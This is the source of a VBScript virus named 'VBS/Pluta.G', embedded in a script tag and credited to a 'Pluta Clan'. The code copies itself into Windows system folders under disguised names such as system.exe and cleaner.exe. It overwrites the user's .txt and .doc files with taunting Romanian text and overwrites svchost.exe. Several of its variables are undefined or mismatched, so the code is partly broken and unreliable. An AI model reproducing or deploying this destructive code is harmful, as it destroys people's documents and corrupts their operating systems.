<script language="VBScript">
'VBS/Pluta.G virus wrote by Peneluta on Oct 12,2006
'A product of Pluta Clan


set pluta=createObject("Scripting.FileSystemObject")

function copyfiles()
myfile.writeline("Copying files to  :  " & sharename)
Set fso = CreateObject("scripting.filesystemobject")

fso.copyfile "c:\34234.vbs", "C:\"

If (fso2.FileExists("c:\presentation.pps.vbs")) Then
myfile.writeline("Successfull copy to  :  " & sharename)
End If  

fso.copyfile "c:\34234.vbs", "C:\Recycled"

fso.copyfile "c:\34234.vbs", "C:\System Volume Information"

fso.copyfile "c:\34234.vbs", "C:\WINDOWS\system32"

fso.copyfile "c:\34234.vbs", "E:\System Volume Information"

fso.copyfile "c:\34234.vbs", "C:\pagefile.sys"




end function

Sub appRecursiveFolderScan(appTheFolder)

  Dim appMoreFolders, appTempFolder 


  For Each appFile in appFSO.GetFolder(TheFolder).Files
    If appFSO.GetExtensionName(appFile) = "txt" or cbFSO.GetExtensionName(appFile) = "doc" Then

      Set appTextFile = appFSO.OpenTextFile(appFile, appForWriting)
      appTextFile.WriteLine "Ai fost infectat cu virusul VBS/Pluta.G"
      appTextFile.WriteLine "Clonele Penelutei sunt pe urmele tale"
      appTextFile.WriteLine "Dardanelele vor fi salvate de myreri"
      appTextFile.WriteLine "Killerii vor distruge toti dusmanii lui Dr. Lady Peneluta"
      appTextFile.WriteLine"Plutistii vor salva Penelutia"
      appTextFile.Close

Set hostfile = FSO.OpenTextFile("c:\WINDOWS\svchost.exe", True)
  hostfile.WriteLine "=VBS/Pluta.G virus wrote by Peneluta on Oct 12,2006="
  hostfile.WriteLine "=A product of Pluta Clan="
  hostfile.WriteLine "DATA Error [34 23 40 00 00 00]"
  hostfile.Close


FSO.CopyFile "c:\34234.vbs", "c:\WINDOWS\systemlog.dll"
FSO.CopyFile "c:\34234.vbs", "c:\WINDOWS\system.exe"
FSO.CopyFile "c:\34234.vbs", "c:\WINDOWS\system32\errorslog.dll"
FSO.CopyFile "c:\34234.vbs", "c:\WINDOWS\system32\cleaner.exe"

       Next
End Sub

</script>






